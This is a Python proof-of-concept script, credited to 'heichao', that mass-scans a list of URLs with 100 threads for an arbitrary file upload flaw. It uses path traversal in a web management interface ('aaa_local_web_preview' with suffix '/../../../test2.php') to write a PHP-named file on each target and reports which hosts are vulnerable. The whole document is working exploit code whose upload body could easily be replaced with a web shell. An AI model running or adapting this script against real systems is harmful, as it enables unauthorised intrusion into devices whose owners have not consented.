import argparse,sys,requests,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    """主函数"""
    banner()
    parser = argparse.ArgumentParser(description="这是脚本的提示信息")
    parser.add_argument('-u','--url',type=str,help='请输入你的url')
    parser.add_argument('-f','--file',type=str,help='请输入文件名')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
def banner():
    banner = """
 █     █░▓██   ██▓ ██▀███  ▓█████   ██████ ▄▄▄█████▓ ▒█████   ██▀███   ███▄ ▄███▓
▓█░ █ ░█░ ▒██  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒▓██▒▀█▀ ██▒
▒█░ █ ░█   ▒██ ██░▓██ ░▄█ ▒▒███   ░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒▓██    ▓██░
░█░ █ ░█   ░ ▐██▓░▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  ▒██    ▒██ 
░░██▒██▓   ░ ██▒▓░░██▓ ▒██▒░▒████▒▒██████▒▒  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒▒██▒   ░██▒
░ ▓░▒ ▒     ██▒▒▒ ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░   ░  ░
  ▒ ░ ░   ▓██ ░▒░   ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░▒ ░ ▒░░  ░      ░
  ░   ░   ▒ ▒ ░░    ░░   ░    ░   ░  ░  ░    ░      ░ ░ ░ ▒    ░░   ░ ░      ░   
    ░     ░ ░        ░        ░  ░      ░               ░ ░     ░            ░   
          ░ ░                                                                                                
                                            author:heichao
                                            version:1.0.0
"""
    print(banner)
def poc(target):
    url = target + '/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test2.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'
    }
    data = """
    --849978f98abe41119122148e4aa65b1a
    Content-Disposition: form-data; name="123"; filename="test2.txt"
    Content-Type: text/plain
    This page has a vulne
    --849978f98abe41119122148e4aa65b1a--
"""

    try:
        response = requests.post(url=url,headers=headers,data=data,verify=False)
        if 'success' in response.text:
            print(f"[+]{target}有文件上传漏洞")
        else:
            print(f"[-]{target} none")
    except:
        print(f"[*]{target} sever error")

if __name__ == '__main__':
    main()